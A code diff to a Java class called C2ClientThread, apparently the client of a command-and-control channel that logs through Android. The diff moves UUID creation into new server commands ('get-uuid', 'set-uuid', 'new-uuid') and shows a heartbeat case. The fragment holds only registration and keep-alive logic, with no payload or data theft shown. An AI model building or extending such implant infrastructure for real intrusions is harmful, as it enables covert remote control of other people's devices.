@@ -26,8 +26,8 @@ public class C2ClientThread extends Thread {
         try {
             this.in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             this.out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
-            this.uuid = UUID.randomUUID();
-            boolean bool = commandDatabase.insertIntoDatabase(uuid.toString(), "", "");
+//
+
 
         } catch (IOException e) {
             e.printStackTrace();
@@ -40,11 +40,20 @@ public class C2ClientThread extends Thread {
             String str = null;
             try {
                 str = in.readLine();
+//                String[] line = str.split(" ");
                 if(str != null){
                     Log.i("received response from server", str);
                     switch (str) {
-                        case "uuid":
+                        // uuid: blah
+                        case "get-uuid":
                             out.println(uuid.toString());
+                            break;
+                        case "set-uuid":
+                            this.uuid = UUID.randomUUID();
+                            break;
+                        case "new-uuid":
+                            this.uuid = UUID.randomUUID();
+                            boolean bool = commandDatabase.insertIntoDatabase(uuid.toString(), "", "");
                             break;
                         case "heartbeat":
                             //str should be heartbeat
